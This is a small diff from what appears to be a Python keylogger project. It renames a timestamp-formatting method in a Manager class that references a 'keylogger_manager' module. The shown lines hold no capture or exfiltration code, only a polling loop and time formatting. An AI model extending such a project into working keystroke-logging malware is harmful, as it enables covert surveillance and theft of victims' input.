@@ -16,7 +16,7 @@ class Manager:
         while self.running:
             time.sleep(self.interval)
 
-    def time_Manager(self):
+    def time_manager(self):
         self.time_man = datetime.datetime.fromtimestamp(self.logger.time).strftime(keylogger_manager.current_time)
 
 
